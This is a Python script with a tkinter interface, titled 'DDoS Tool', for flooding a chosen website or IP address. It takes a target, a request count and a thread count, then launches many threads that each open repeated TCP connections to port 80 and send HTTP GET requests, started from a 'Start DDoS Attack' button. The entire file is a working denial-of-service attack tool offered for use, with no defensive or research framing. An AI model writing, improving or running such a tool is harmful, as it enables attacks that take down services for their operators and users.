import tkinter as tk
from tkinter import ttk
import socket
import threading

# Default HTTP port
target_port = 80

def start_ddos():
    target = ip_entry.get() or url_entry.get()
    if not target:
        error_label.config(text="Please provide IP or URL!")
        return
    
    try:
        socket.inet_aton(target)
    except socket.error:
        try:
            target = socket.gethostbyname(target)
        except socket.gaierror:
            error_label.config(text="Invalid target IP/URL!")
            return
    
    num_requests = requests_entry.get()
    num_threads = threads_entry.get()
    
    if not num_requests.isdigit() or int(num_requests) <= 0:
        error_label.config(text="Invalid number of requests!")
        return
    
    if not num_threads.isdigit() or int(num_threads) <= 0:
        error_label.config(text="Invalid number of threads!")
        return
    
    num_requests = int(num_requests)
    num_threads = int(num_threads)
    
    def ddos():
        for _ in range(num_threads):
            thread = threading.Thread(target=send_requests, args=(target, num_requests))
            thread.start()
    
    threading.Thread(target=ddos).start()

def send_requests(target, num_requests):
    for _ in range(num_requests):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target, target_port))
                sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                progress.step(1)
        except:
            pass

# GUI setup
window = tk.Tk()
window.title("DDoS Tool")
window.geometry("500x500")

fields = [
    ("Target IP:", tk.Entry(window)),
    ("Target URL:", tk.Entry(window)),
    ("Number of Requests:", tk.Entry(window)),
    ("Number of Threads:", tk.Entry(window))
]

for label_text, entry_widget in fields:
    label = tk.Label(window, text=label_text)
    label.pack()
    entry_widget.pack()

ip_entry, url_entry, requests_entry, threads_entry = [entry for _, entry in fields]

start_button = tk.Button(window, text="Start DDoS Attack", command=start_ddos)
start_button.pack()

error_label = tk.Label(window, text="", fg="red")
error_label.pack()

progress_label = tk.Label(window, text="Progress:")
progress_label.pack()
progress = ttk.Progressbar(window, orient='horizontal', length=200, mode='determinate')
progress.pack()

window.mainloop()
